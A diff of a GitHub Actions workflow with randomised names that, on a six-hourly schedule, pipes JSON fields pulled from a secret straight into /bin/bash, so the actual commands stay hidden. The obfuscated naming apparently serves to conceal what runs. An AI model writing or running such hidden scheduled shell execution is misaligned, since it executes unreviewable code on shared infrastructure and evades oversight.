@@ -2,26 +2,23 @@ name: luyanxianga
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
+    - cron: '34 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luyanxianga
         env:
-          hkfwa57: ${{ secrets.hkfwa57 }}
+          tq674: ${{ secrets.tq674 }}
         run: |
-          echo $hkfwa57 | jq -r .tqgm2 | /bin/bash
-          echo $elk07 | jq -r .xq7 | /bin/bash
-          echo $yug02713 | jq -r .ht6198 | /bin/bash
-          echo $e6 | jq -r .ikot1 | /bin/bash
-          echo $wl774 | jq -r .vav893 | /bin/bash
-          echo $cpybh2 | jq -r .nalal8 | /bin/bash
-          echo $dgwd53330 | jq -r .eiaf07218 | /bin/bash
-          echo $jgeya40 | jq -r .y4121 | /bin/bash
-          echo $atbxh52822 | jq -r .pscxh972 | /bin/bash
-          echo $zwu2 | jq -r .eoumd7812 | /bin/bash
+          echo $tq674 | jq -r .cp3 | /bin/bash
+          echo $f45 | jq -r .jol36760 | /bin/bash
+          echo $s4927 | jq -r .tbqp52 | /bin/bash
+          echo $wnmij30 | jq -r .hhrvn977 | /bin/bash
+          echo $kk913 | jq -r .hn3 | /bin/bash
+          echo $a95237 | jq -r .jalbj8 | /bin/bash
+          echo $cef23614 | jq -r .bgkk7417 | /bin/bash
+          echo $h3614 | jq -r .ftui8 | /bin/bash
 
